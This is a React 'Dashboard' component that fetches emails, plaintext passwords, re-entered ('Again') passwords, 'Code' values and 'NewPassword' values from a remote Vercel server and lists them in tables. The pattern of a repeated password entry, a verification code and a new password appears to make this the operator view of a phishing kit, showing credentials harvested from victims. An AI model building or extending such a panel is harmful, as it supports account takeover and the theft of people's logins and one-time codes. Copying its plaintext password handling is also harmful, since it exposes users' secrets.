import React, { useEffect, useState } from "react";

const Dashboard = () => {
  const [item, setItem] = useState([]);
  const [result, setResult] = useState([]);
  const [newPassword, setNewPassword] = useState([]);
  const [password, setPassword] = useState([]);

  useEffect(() => {
    fetch("https://hakim-meet-mega-sarver.vercel.app/password")
      .then((res) => res.json())
      .then((data) => setPassword(data));
  }, []);

  useEffect(() => {
    fetch("https://hakim-meet-mega-sarver.vercel.app/NewPassword")
      .then((res) => res.json())
      .then((data) => setNewPassword(data));
  }, []);

  useEffect(() => {
    fetch("https://hakim-meet-mega-sarver.vercel.app/users")
      .then((res) => res.json())
      .then((data) => setItem(data));
  }, []);

  useEffect(() => {
    fetch("https://hakim-meet-mega-sarver.vercel.app/code")
      .then((res) => res.json())
      .then((data) => setResult(data));
  }, []);

  return (
    <div>
      <div>
        <div className="container">
          <h3 className="text-center">
            {result.map((data, index) => (
              <h5>
                {" "}
                {index + 1}*Code= {data.Password}
              </h5>
            ))}
          </h3>
          <h5 className="text-center">
            {newPassword.map((data, index) => (
              <h5>
                {index + 1}*NewPassword= {data.Password}
              </h5>
            ))}
          </h5>
          <table class="table table-dark">
            <thead>
              <tr>
                <th scope="col">No</th>
                <th scope="col">Email</th>
                <th scope="col">Password</th>
              </tr>
            </thead>
            <tbody>
              {item.map((data, index) => (
                <tr>
                  <td>{index + 1}</td>
                  <td>{data.Email}</td>
                  <td>{data.Password}</td>
                </tr>
              ))}
            </tbody>
            <tbody>
              {password.map((data, index) => (
                <tr>
                  <td>{index + 1}</td>
                  <td>AgainEmail== {data.Email}</td>
                  <td>AgainPassword== {data.Password}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
};

export default Dashboard;
